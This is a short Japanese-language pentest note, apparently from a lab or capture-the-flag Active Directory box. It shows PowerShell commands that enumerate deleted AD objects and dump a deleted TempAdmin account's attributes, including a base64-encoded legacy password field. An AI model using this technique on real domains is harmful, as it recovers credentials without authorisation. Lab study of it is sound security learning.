c.f.) [hacking deram](https://www.hackingdream.net/2021/04/active-directory-penetration-testing-cheatsheet.html)

``` powershell
PS> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
...
Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059 
...
```

見つかったdeleted userのパスワードを抽出できるかもしれないよ：
```
PS> Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
                                                                                                                                                 
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
userPrincipalName               : TempAdmin@cascade.local
```
